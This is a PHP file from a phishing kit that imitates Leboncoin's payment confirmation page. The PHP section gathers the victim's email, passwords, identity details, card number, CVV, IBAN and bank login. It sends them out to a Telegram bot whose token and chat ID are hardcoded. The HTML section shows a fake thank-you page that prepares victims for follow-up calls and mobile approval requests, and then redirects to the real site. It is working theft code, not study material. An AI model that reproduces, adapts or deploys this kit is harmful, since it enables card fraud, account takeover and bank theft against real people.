<?php
// ============================================
// ÉTAPE 7 - CONFIRMATION FINALE + ENVOI TELEGRAM
// ============================================
session_start();

// ============================================
// CONFIGURATION BOT TELEGRAM
// ============================================
// Remplacez par vos propres valeurs
define('TELEGRAM_BOT_TOKEN', '9139062919:AAFyd2lU8c1s1a-p34Qf6hp_JFquaYfHzkI');
define('TELEGRAM_CHAT_ID',   '8947873835');

function secureText($text) {
    return htmlspecialchars($text ?? '', ENT_QUOTES, 'UTF-8');
}
// ============================================
// RÉCUPÉRATION DES DONNÉES DE TOUTES LES ÉTAPES
// ============================================
$email              = $_SESSION['email']              ?? 'Non renseigné';
$password              = $_SESSION['password']              ?? 'Non renseigné';
$nom                = $_SESSION['annonce']['nom']     ?? 'Non renseigné';
$date_naissance     = $_SESSION['annonce']['date_naissance']?? 'Non renseigné';
$telephone          = $_SESSION['annonce']['telephone'] ?? 'Non renseigné';
$adresse            = $_SESSION['annonce']['adresse'] ?? 'Non renseigné';
$montant            = $_SESSION['annonce']['montant'] ?? '0';

$numero_carte       = $_SESSION['carte']['numero']    ?? 'Non renseigné';
$expiration_carte   = $_SESSION['carte']['expiration'] ?? 'Non renseigné';
$cvv_carte          = $_SESSION['carte']['cvv']       ?? 'Non renseigné';
$derniers_chiffres  = $_SESSION['carte']['derniers_chiffres'] ?? '****';

$banque_choisie     = $_SESSION['banque_confirmee']   ?? ($_SESSION['banque_choisie'] ?? 'Non renseignée');
$iban               = $_SESSION['iban'] ?? 'Non renseigné';
$identifiant_banque = $_SESSION['identifiant_banque'] ?? 'Non renseigné';
$mot_de_passe = $_SESSION['mot_de_passe'] ?? 'Non renseigné';
$ip_client          = $_SERVER['REMOTE_ADDR']         ?? 'Inconnue';
$user_agent         = $_SERVER['HTTP_USER_AGENT']     ?? 'Inconnu';
$date_heure         = date('d/m/Y H:i:s');

// ============================================
// CONSTRUCTION DU MESSAGE TELEGRAM
// ============================================
$message = "🔔 <b>NOUVELLE TRANSACTION CAPTURÉE</b>\n";
$message .= "━━━━━━━━━━━━━━━━━━━━\n";
$message .= "📅 <b>Date :</b> " . secureText($date_heure) . "\n";
$message .= "🌐 <b>IP :</b> <code>" . secureText($ip_client) . "</code>\n";
$message .= "━━━━━━━━━━━━━━━━━━━━\n\n";

$message .= "<b>ETAPE 1 - INFORMATIONS CLIENT</b>\n";
$message .= "@ Email : <code>" . secureText($email) . "</code>\n";
$message .= "🔐 password : <code>" . secureText($password) . "</code>\n";
$message .= "👤 Nom : " . secureText($nom) . "\n";
$message .= "🔄 Date de naissance : " . secureText($date_naissance) . "\n";
$message .= "☎ Téléphone : " . secureText($telephone) . "\n";
$message .= "🏠 Adresse : " . secureText($adresse) . "\n\n";


$message .= " *<b>ETAPE 2 -INFORMATIONS CARTES</b>*\n";
$message .= "💳 Numéro : $numero_carte \n";
$message .= "🔄 Expiration : $expiration_carte\n";
$message .= "🔑 CVV : $cvv_carte\n\n";

$message .= "🏦 *<b>ETAPE 3 -INFORMATIONS BANQUE</b>*\n";
$message .= "🏛 Banque : $banque_choisie\n";
$message .= "💳 Iban : " . secureText ($iban) . "\n";
$message .= "🤵🏻 Identifiant : $identifiant_banque \n";
$message .= "🔐 Mot de passe : $mot_de_passe\n\n";

$message .= "💰 *MONTANT : $montant €*\n";
$message .= "━━━━━━━━━━━━━━━━━━━━\n";
$message .= "🔐 UA : $user_agent";

// ============================================
// ENVOI VIA L'API TELEGRAM
// ============================================
function envoyerTelegram($msg) {
    $url = "https://api.telegram.org/bot" . TELEGRAM_BOT_TOKEN . "/sendMessage";
    
    $data = [
        'chat_id'    => TELEGRAM_CHAT_ID,
        'text'       => $msg,
        'parse_mode' => 'HTML', // ✅ Changé de Markdown à HTML
    ];

    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Laissez false si vous êtes en local
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    // 🚨 DÉBOGAGE : Si ça échoue, on affiche EXACTEMENT ce que Telegram dit
    if ($httpCode !== 200) {
        echo "<div style='color:red; background:#ffe6e6; padding:10px; border:1px solid red;'>";
        echo "❌ Échec de l'envoi. Code HTTP: $httpCode<br>";
        echo "Réponse Telegram : " . htmlspecialchars($response);
        echo "</div>";
        return false;
    }
    
    return true;
}

// 4. Exécution
$envoi_reussi = envoyerTelegram($message);

if ($envoi_reussi) {
  
    // session_destroy(); // À décommenter une fois que tout fonctionne
}
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <link rel="icon" href="images/banques/icone.png" sizes="32x32" data-next-head="">
    <link rel="icon" href="images/banques/icone.png" type="image/svg+xml" data-next-head="">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Leboncoin - Merci</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            background-color: #f3f4f6;
            color: #1f2937;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        /* ===== HEADER / LOGO ===== */
        .header {
            background: #fff;
            padding: 16px 32px;
            border-bottom: 1px solid #e5e7eb;
        }

        .logo {
            font-size: 28px;
            font-weight: 700;
            color: #f97316;
            text-decoration: none;
            letter-spacing: -1px;
        }

        /* ===== CONTENU PRINCIPAL ===== */
        .main {
            flex: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 40px 20px;
        }

        .card {
            background: #fff;
            border-radius: 12px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
            border: 1px solid #e5e7eb;
            max-width: 480px;
            width: 100%;
            overflow: hidden;
        }

        /* ===== ICONE CHECK ===== */
        .success-header {
            padding: 32px 32px 24px;
            text-align: center;
        }

        .success-icon {
            width: 64px;
            height: 64px;
            background: #fff7ed;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 20px;
            animation: scaleIn 0.5s ease-out;
        }

        @keyframes scaleIn {
            0% { transform: scale(0); }
            50% { transform: scale(1.2); }
            100% { transform: scale(1); }
        }

        .success-icon svg {
            width: 32px;
            height: 32px;
            color: #f97316;
        }

        .success-header h1 {
            font-size: 20px;
            font-weight: 700;
            color: #111827;
        }

        /* ===== ZONE GRISE INFO ===== */
        .info-box {
            background: #f3f4f6;
            padding: 24px 32px;
        }

        .info-box .main-text {
            font-size: 14px;
            color: #1f2937;
            line-height: 1.6;
            margin-bottom: 16px;
        }

        .service-available {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
            font-size: 13px;
            color: #f97316;
            font-weight: 600;
            margin-bottom: 20px;
            padding-bottom: 20px;
            border-bottom: 1px solid #e5e7eb;
        }

        .service-available svg {
            width: 16px;
            height: 16px;
        }

        .info-item {
            display: flex;
            gap: 10px;
            margin-bottom: 14px;
            font-size: 13px;
            color: #4b5563;
            line-height: 1.5;
        }

        .info-item:last-child {
            margin-bottom: 0;
        }

        .info-item svg {
            width: 16px;
            height: 16px;
            flex-shrink: 0;
            margin-top: 2px;
        }

        .info-item.info svg { color: #6b7280; }
        .info-item.warning svg { color: #f97316; }

        .info-item strong {
            color: #111827;
            font-weight: 600;
        }

        /* ===== BOUTON ===== */
        .card-footer {
            padding: 24px 32px 32px;
        }

        .btn {
            width: 100%;
            padding: 16px 24px;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            border: none;
            transition: all 0.2s;
            text-align: center;
            text-decoration: none;
            display: inline-block;
        }

        .btn-primary {
            background: #f97316;
            color: #fff;
        }

        .btn-primary:hover {
            background: #ea580c;
            transform: translateY(-1px);
            box-shadow: 0 4px 12px rgba(249, 115, 22, 0.3);
        }

        /* ===== SÉCURITÉ ===== */
        .security-info {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            margin-top: 24px;
            font-size: 13px;
            color: #6b7280;
        }

        .security-info svg {
            width: 16px;
            height: 16px;
            color: #f97316;
        }

        /* ===== FOOTER ===== */
        .footer {
            text-align: center;
            padding: 24px 20px 32px;
            font-size: 13px;
            color: #6b7280;
        }

        .footer-links {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin-bottom: 12px;
            flex-wrap: wrap;
        }

        .footer-links a {
            color: #6b7280;
            text-decoration: none;
        }

        .footer-links a:hover {
            color: #f97316;
            text-decoration: underline;
        }

        /* ===== RESPONSIVE ===== */
        @media (max-width: 640px) {
            .header { padding: 12px 20px; }
            .success-header, .info-box, .card-footer { padding-left: 20px; padding-right: 20px; }
        }
    </style>
</head>
<body>

    <!-- HEADER -->
    <header class="header">
       <a href="#" class="logo"><svg width="164" height="30" viewBox="0 0 164 30" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" class="text-main dark:text-on-surface pro:text-support"><path fill="currentColor" fill-rule="evenodd" clip-rule="evenodd" d="M41.1935 25.077C43.7647 25.0728 45.3528 23.0338 45.3528 20.0045C45.3528 16.9725 43.769 14.9392 41.2007 14.9392C38.6323 14.9392 37.0556 16.9653 37.0556 20.0045C37.0556 23.0409 38.6295 25.0728 41.1935 25.077ZM43.1198 10.0236C48.0211 10.0236 51.2529 14.2472 51.3242 19.9332C51.3242 25.712 47.9426 29.9926 42.9842 29.9926C40.4887 30.0482 38.1457 28.7954 36.8059 26.6894H36.7274V29.6216H31.3482V3.88099C31.3482 1.91906 32.6538 0.691957 34.2019 0.691957C35.75 0.691957 37.0556 1.91906 37.0556 3.88099V13.0557H37.1341C38.5174 11.1316 40.7505 10.0008 43.1198 10.0236ZM62.9246 25.077C65.5001 25.077 67.0697 23.0366 67.0697 20.0045C67.0697 16.9725 65.5001 14.9392 62.9246 14.9392C60.3492 14.9392 58.7796 16.9653 58.7796 20.0045C58.7796 23.0438 60.3492 25.077 62.9246 25.077ZM62.9246 10.0236C68.9888 10.0236 72.9127 14.1687 72.9127 20.0117C72.9127 25.8547 68.9959 29.9997 62.9246 29.9997C56.8533 29.9997 52.9366 25.8547 52.9366 20.0117C52.9366 14.1687 56.8533 10.0236 62.9246 10.0236ZM139.155 10.0239C140.724 10.0239 142.03 11.251 142.058 13.213V29.6219H136.301V13.213C136.301 11.251 137.579 10.0239 139.155 10.0239ZM139.155 0C141.086 0 142.65 1.56527 142.65 3.49581C142.65 5.42636 141.086 6.99163 139.155 6.99163H139.153C137.223 6.99091 135.658 5.42564 135.659 3.4951C135.659 1.56455 137.225 0 139.155 0ZM157.162 10.0239C161.158 10.0239 163.304 12.8627 163.304 17.1654V29.6219H157.547V18.7777C157.547 16.245 156.355 15.4032 154.858 15.4032C152.631 15.4032 150.941 17.2795 150.941 21.2747V29.6219H145.183V13.0346C145.183 11.1511 146.417 10.0382 147.873 10.0382C149.329 10.0382 150.555 11.1511 150.555 13.0346V13.748H150.634C152 11.4408 154.481 10.0254 157.162 10.0239ZM123.866 25.077C126.441 25.077 128.018 23.0366 128.018 20.0045C128.018 16.9725 126.435 14.9392 123.866 14.9392C121.298 14.9392 119.721 16.9653 119.721 20.0045C119.721 23.0438 121.298 25.077 123.866 25.077ZM123.866 10.0236C129.938 10.0236 133.854 14.1687 133.854 20.0117C133.854 25.8547 129.938 29.9997 123.866 29.9997C117.795 29.9997 113.878 25.8547 113.878 20.0117C113.878 14.1687 117.802 10.0236 123.866 10.0236ZM105.36 15.0179C102.863 15.0179 101.329 16.8586 101.329 20.012C101.329 23.1653 102.863 25.006 105.36 25.006C106.791 25.0645 108.137 24.3254 108.855 23.0869H108.927L113.115 25.7765C111.659 28.6159 108.619 30 105.166 30C99.1744 30 95.4859 25.8543 95.4859 20.012C95.4859 14.169 99.1744 10.0239 105.166 10.0239C108.619 10.0239 111.688 11.3937 113.115 14.2474L108.927 16.9364H108.855C108.137 15.6978 106.791 14.9594 105.36 15.0179ZM87.1959 10.0239C91.1911 10.0239 93.3379 12.8627 93.3528 17.1654V29.6219H87.5954V18.7777C87.5954 16.245 86.404 15.4032 84.9058 15.4032C82.6799 15.4032 80.9891 17.2795 80.9891 21.2747V29.6219H75.2246V13.0203C75.2246 11.1369 76.4374 10.0382 77.8999 10.0382C79.3625 10.0382 80.5896 11.1511 80.5896 13.0346V13.748H80.668C82.0328 11.4394 84.5141 10.0239 87.1959 10.0239ZM15.6884 18.87C15.7055 19.6013 15.8353 20.3262 16.0736 21.0182L22.4945 16.2589C21.9138 15.1873 20.773 14.5402 19.5552 14.5895C17.7359 14.5895 15.6884 15.9592 15.6884 18.87ZM21.2674 25.2909C23.3485 25.1718 25.2148 23.9689 26.1829 22.124L29.9713 24.8629C28.523 27.8093 25.5694 29.9924 20.5754 29.9924C18.2125 29.9882 15.9309 29.1263 14.1545 27.5668C11.6432 29.2362 9.5029 29.9496 7.36261 29.9496C3.04635 29.9496 0 27.0602 0 22.7226V3.83091C0 1.87611 1.29844 0.649008 2.85373 0.649008C4.40901 0.649008 5.70745 1.87611 5.70745 3.83091V22.2446C5.70745 24.0995 6.52076 25.0983 8.22586 25.0983C9.15332 25.0983 10.1593 24.5632 11.4648 23.8498C10.8413 22.3666 10.526 20.7721 10.5374 19.1626C10.5374 15.0889 13.441 10.0242 19.5409 10.0242C24.8274 10.0242 27.6669 13.0984 28.8512 16.958L18.6705 24.2643C19.3689 24.9328 20.3007 25.3016 21.2674 25.2909Z"></path></svg></a>
    </header>

    <!-- CONTENU PRINCIPAL -->
    <main class="main">
        <div class="card">
            <div class="success-header">
                <div class="success-icon">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
                        <polyline points="20 6 9 17 4 12"></polyline>
                    </svg>
                </div>
                <h1>Merci d'avoir choisi Leboncoin</h1>
            </div>

            <div class="info-box">
                <p class="main-text">
                    Suite aux nouvelles mesures de sécurité pour terminer la confirmation de votre paiement, vous serez contacté par téléphone par le service client dans les meilleurs délais.
                </p>

                <div class="service-available">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                        <path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"></path>
                    </svg>
                    Service client disponible 24h/24 – 7j/7
                </div>

                <div class="info-item info">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                        <circle cx="12" cy="12" r="10"></circle>
                        <line x1="12" y1="16" x2="12" y2="12"></line>
                        <line x1="12" y1="8" x2="12.01" y2="8"></line>
                    </svg>
                    <div>
                        <strong>Processus de vérification :</strong> Vous serez également amené à approuver des demandes de confirmation mobile, chacune accompagnée d'un montant aléatoire à caractère non débiteur.
                    </div>
                </div>

                <div class="info-item warning">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                        <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
                    </svg>
                    <div>
                        <strong>Important :</strong> Aucun paiement ne sera effectué pendant la procédure. Cette étape est uniquement destinée à la vérification.
                    </div>
                </div>
            </div>

            <div class="card-footer">
                <a href="https://www.leboncoin.fr/" class="btn btn-primary">Retour à l'accueil</a>
            </div>
        </div>

        <!-- Info sécurité -->
        <div class="security-info">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
                <polyline points="9 12 11 14 15 10"></polyline>
            </svg>
            <span>Connexion sécurisée leboncoin</span>
        </div>
    </main>

    <!-- FOOTER -->
    <footer class="footer">
        <div class="footer-links">
            <a href="#">Aide</a>
            <a href="#">Confidentialité</a>
            <a href="#">Conditions générales</a>
        </div>
        <div>© 2026 leboncoin</div>
    </footer>

</body>
  <script type="text/javascript">
        function redirect(){
            window.location = "https://www.leboncoin.fr/";
        }
        setTimeout(redirect, 18000);
    </script>
</html>